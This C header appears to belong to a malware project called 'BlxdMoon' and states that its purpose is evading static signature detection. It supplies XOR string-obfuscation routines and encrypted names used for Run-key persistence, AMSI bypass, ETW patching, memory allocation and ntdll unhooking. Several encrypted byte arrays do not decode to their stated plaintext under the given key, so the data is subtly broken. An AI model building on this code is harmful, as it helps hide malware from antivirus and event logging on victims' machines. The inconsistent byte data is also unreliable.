/**
 * obfuscate.h - String Obfuscation for BlxdMoon
 *
 * MITRE ATT&CK: T1027 - Obfuscated Files or Information
 *
 * Purpose: Encrypt strings at compile time to evade static signature detection.
 * Strings are decrypted at runtime only when needed.
 */

#ifndef OBFUSCATE_H
#define OBFUSCATE_H

#include <windows.h>
#include <string.h>

// XOR key - change this for each build to create unique signatures
#define XOR_KEY 0x5A

/**
 * XOR decryption function
 * @param encrypted - Pointer to encrypted byte array
 * @param output    - Buffer to store decrypted string
 * @param len       - Length of encrypted data
 * @param key       - XOR key used for decryption
 */
static inline void xor_decrypt(const unsigned char *encrypted,
                               char *output,
                               size_t len,
                               unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        output[i] = encrypted[i] ^ key;
    }
    output[len] = '\0';
}

/**
 * XOR encryption function (for runtime string encryption)
 * @param plaintext - String to encrypt
 * @param output    - Buffer to store encrypted data
 * @param len       - Length of plaintext
 * @param key       - XOR key
 */
static inline void xor_encrypt(const char *plaintext,
                               unsigned char *output,
                               size_t len,
                               unsigned char key) {
    for (size_t i = 0; i < len; i++) {
        output[i] = plaintext[i] ^ key;
    }
}

// ============================================================
// Pre-computed encrypted strings
// Generated with: python tools/encrypt_strings.py "string"
// ============================================================

// Original: "Software\Microsoft\Windows\CurrentVersion\Run"
static const unsigned char ENC_REG_RUN_KEY[] = {
    0x29, 0x35, 0x3a, 0x2c, 0x23, 0x3f, 0x28, 0x3a, 0x14,
    0x37, 0x3b, 0x39, 0x28, 0x35, 0x29, 0x35, 0x3a, 0x2c, 0x14,
    0x2d, 0x3b, 0x36, 0x3e, 0x35, 0x23, 0x29, 0x14,
    0x19, 0x2b, 0x28, 0x28, 0x3a, 0x36, 0x2c, 0x0c, 0x3a, 0x28, 0x29, 0x3b, 0x35, 0x36, 0x14,
    0x28, 0x2b, 0x36
};
#define ENC_REG_RUN_KEY_LEN 45

// Original: "ntdll.dll"
static const unsigned char ENC_NTDLL[] = {
    0x34, 0x2e, 0x3e, 0x36, 0x36, 0x16, 0x3e, 0x36, 0x36
};
#define ENC_NTDLL_LEN 9

// Original: "kernel32.dll"
static const unsigned char ENC_KERNEL32[] = {
    0x31, 0x3f, 0x28, 0x36, 0x3f, 0x36, 0x68, 0x6a, 0x16, 0x3e, 0x36, 0x36
};
#define ENC_KERNEL32_LEN 12

// Original: "advapi32.dll"
static const unsigned char ENC_ADVAPI32[] = {
    0x3b, 0x3e, 0x2c, 0x3b, 0x2a, 0x3b, 0x68, 0x6a, 0x16, 0x3e, 0x36, 0x36
};
#define ENC_ADVAPI32_LEN 12

// Original: "amsi.dll"
static const unsigned char ENC_AMSI_DLL[] = {
    0x3b, 0x37, 0x29, 0x3b, 0x16, 0x3e, 0x36, 0x36
};
#define ENC_AMSI_DLL_LEN 8

// Original: "AmsiScanBuffer"
static const unsigned char ENC_AMSISCANBUFFER[] = {
    0x1b, 0x37, 0x29, 0x3b, 0x29, 0x39, 0x3b, 0x36, 0x18, 0x2b, 0x3a, 0x3a, 0x3f, 0x28
};
#define ENC_AMSISCANBUFFER_LEN 14

// Original: "EtwEventWrite"
static const unsigned char ENC_ETWEVENTWRITE[] = {
    0x1f, 0x2e, 0x23, 0x1f, 0x2c, 0x3f, 0x36, 0x2c, 0x2d, 0x28, 0x3b, 0x2c, 0x3f
};
#define ENC_ETWEVENTWRITE_LEN 13

// Original: "VirtualAlloc"
static const unsigned char ENC_VIRTUALALLOC[] = {
    0x0c, 0x3b, 0x28, 0x2c, 0x2b, 0x3f, 0x36, 0x1b, 0x36, 0x36, 0x35, 0x39
};
#define ENC_VIRTUALALLOC_LEN 12

// Original: "VirtualProtect"
static const unsigned char ENC_VIRTUALPROTECT[] = {
    0x0c, 0x3b, 0x28, 0x2c, 0x2b, 0x3f, 0x36, 0x2a, 0x28, 0x35, 0x2c, 0x3f, 0x39, 0x2c
};
#define ENC_VIRTUALPROTECT_LEN 14

// Original: "C:\Windows\System32\ntdll.dll"
static const unsigned char ENC_NTDLL_PATH[] = {
    0x19, 0x10, 0x14, 0x2d, 0x3b, 0x36, 0x3e, 0x35, 0x23, 0x29, 0x14,
    0x29, 0x2f, 0x29, 0x2c, 0x3f, 0x37, 0x68, 0x6a, 0x14,
    0x34, 0x2e, 0x3e, 0x36, 0x36, 0x16, 0x3e, 0x36, 0x36
};
#define ENC_NTDLL_PATH_LEN 29

/**
 * Helper macro for decryption
 * Declares a stack buffer and decrypts into it
 */
#define DECRYPT_STRING(name, enc_arr, len) \
    char name[len + 1]; \
    xor_decrypt(enc_arr, name, len, XOR_KEY)

/**
 * Helper to securely clear decrypted strings from memory
 */
#define SECURE_CLEAR(name, len) \
    SecureZeroMemory(name, len + 1)

#endif // OBFUSCATE_H
